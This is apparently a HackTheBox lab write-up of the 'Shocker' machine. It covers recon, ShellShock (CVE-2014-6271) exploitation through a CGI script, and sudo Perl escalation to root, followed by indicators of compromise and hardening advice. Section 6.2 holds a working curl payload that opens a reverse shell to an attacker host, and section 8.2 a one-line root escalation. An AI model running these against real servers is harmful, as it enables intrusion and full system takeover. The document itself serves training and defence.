# Shocker - Technical Report

> **Platform:** HackTheBox \
> **Difficulty:** `Easy` \
> **Date:** 2026-03-07 \
> **Author:** 0N1S3C \
> **Scope:** Authorized lab environment only 

---

## 0. Executive Summary

The "Shocker" machine was compromised via the ShellShock vulnerability (CVE-2014-6271), a critical flaw in Bash that allows arbitrary command injection through environment variables. A CGI script exposed on the web server provided the attack surface. Initial access was gained as `shelly` by injecting a reverse shell payload into the HTTP User-Agent header. A sudo misconfiguration granting unrestricted Perl execution escalated privileges to root with a single command. Immediate patching of Bash, removal of unnecessary CGI scripts, and a full audit of sudo permissions are recommended.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation
of the **"Shocker"** machine on HackTheBox.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow the standardized approach defined
in `methodology.md`.

---

## 2. Attack Chain

```
Nmap → Gobuster (/cgi-bin/user.sh) → ShellShock CVE-2014-6271 → shelly shell → sudo perl (GTFOBins) → Root
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `gobuster` | Directory & file enumeration |
| `curl` | ShellShock payload delivery via HTTP header |
| `netcat` | Reverse shell listener |
| GTFOBins | Sudo perl privesc reference |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV -p- -T4 -Pn 10.129.1.105
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 80/tcp | HTTP | Apache httpd 2.4.18 (Ubuntu) | Main attack surface |
| 2222/tcp | SSH | OpenSSH 7.2p2 Ubuntu | Non-standard port — potential lateral access |

**Key Observations:**
- `-Pn` required — host blocking ICMP ping probes
- SSH on non-standard port 2222 — worth noting for post-exploitation
- Attack surface primarily web-based

---

## 5. Service Enumeration

### 5.1 Web Enumeration

**Tools Used:** `gobuster`, `curl`

**Commands:**
```bash
# Initial scan
gobuster dir -u http://10.129.1.105 -w /usr/share/wordlists/dirb/common.txt -x sh,cgi

# Targeted scan inside /cgi-bin/
gobuster dir -u http://10.129.1.105/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,cgi,pl
```

**Findings:**

| Path | Status | Notes |
|------|--------|-------|
| `/cgi-bin/` | 403 | Exists but forbidden at root level |
| `/cgi-bin/user.sh` | 200 | Bash CGI script — ShellShock target |

**Key Finding:** `/cgi-bin/user.sh` is a Bash CGI script that outputs uptime information. CGI scripts pass HTTP headers as environment variables to Bash — making this a direct ShellShock attack surface.

```bash
# Confirming the script
curl http://10.129.1.105/cgi-bin/user.sh
# Output: Just an uptime test script + uptime info
```

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** ShellShock — CVE-2014-6271 \
**Location:** `http://10.129.1.105/cgi-bin/user.sh` \
**Reasoning:** Bash versions prior to 4.3 patch 25 execute commands appended after function definitions in environment variables. Apache CGI passes HTTP request headers (User-Agent, Referer, etc.) as environment variables to the executing script — providing a direct injection point.

**ShellShock payload structure:**
```
() { :;}; <injected command>
```
Bash parses the function definition `() { :;}` and then blindly executes whatever follows.

### 6.2 Exploitation

```bash
# Start listener
nc -lvnp 4444

# Deliver ShellShock payload via User-Agent header
curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1" \
  http://10.129.1.105/cgi-bin/user.sh
```

**Result:** Reverse shell obtained as `shelly`.

---

## 7. Lateral Movement

Not applicable — initial access landed directly as `shelly`, the primary user account. User flag located at `/home/shelly/user.txt`.

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**
- [x] `sudo -l` — immediate critical finding

**Key Findings:**
- `shelly` can run `/usr/bin/perl` as root with no password required

### 8.2 Escalation Vector

**Vector:** Sudo unrestricted Perl execution (GTFOBins) \
**Root Cause:** Perl allows arbitrary OS command execution via `exec()`. Granting unrestricted sudo access to any scripting interpreter is equivalent to granting a root shell.

```bash
sudo perl -e 'exec "/bin/bash"'
```

**Result:** Root shell obtained instantly.

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | ShellShock (CVE-2014-6271) — RCE via HTTP header | 🔴 Critical | `/cgi-bin/user.sh` |
| 2 | sudo misconfiguration — unrestricted Perl as root (NOPASSWD) | 🔴 Critical | `/etc/sudoers` |
| 3 | Unnecessary CGI script exposed on web server | 🟠 High | `/cgi-bin/user.sh` |
| 4 | SSH on non-standard port — potential lateral access vector | 🔵 Low | Port 2222 |

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- Unusual User-Agent strings containing `() { :;};` in Apache access logs
- Outbound connections from Apache/CGI process to unknown IPs
- Unexpected Perl processes spawned with root privileges
- Reverse shell processes in process tree under `apache2` or `shelly`

### 10.2 Security Weaknesses

- Unpatched Bash version vulnerable to ShellShock (CVE-2014-6271)
- CGI script unnecessarily exposed — no business justification for public access
- Sudo grants full scripting interpreter access (Perl) with no restrictions

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Patch Bash to version ≥ 4.3 patch 25 | Finding 1 |
| Immediate | Remove or restrict access to `/cgi-bin/user.sh` | Finding 3 |
| Immediate | Restrict sudo permissions — never grant unrestricted interpreter access | Finding 2 |
| Short-term | Audit all CGI scripts for necessity and exposure | Finding 3 |
| Short-term | Implement WAF rules to detect ShellShock patterns in headers | Finding 1 |
| Long-term | Apply least privilege principle across all sudo rules | Finding 2 |

---

## 11. Lessons Learned

- **Extensions matter in gobuster** — using `-x sh,cgi,pl` was the difference between finding `user.sh` and missing it entirely. Always enumerate with relevant extensions for the technology stack.
- **ShellShock is header-agnostic** — User-Agent, Referer, Cookie, any header passed to CGI is a potential injection point. The attack surface is wider than it first appears.
- **GTFOBins is essential knowledge** — sudo + any scripting interpreter (perl, python, ruby, lua) = instant root. Recognizing this pattern immediately is a core red team skill.
- **One misconfiguration can end a box** — from initial access to root in a single `sudo perl` command. Privilege escalation isn't always complex, it's often just misconfiguration.
- **CVE research is a real skill** — ShellShock is from 2014 but still appears in real environments. Recognizing the conditions (CGI + Bash) and knowing the exploit pattern is what separates good pentesters from great ones.

---

*End of Report* \
*Classification: Public — flags and sensitive values omitted*
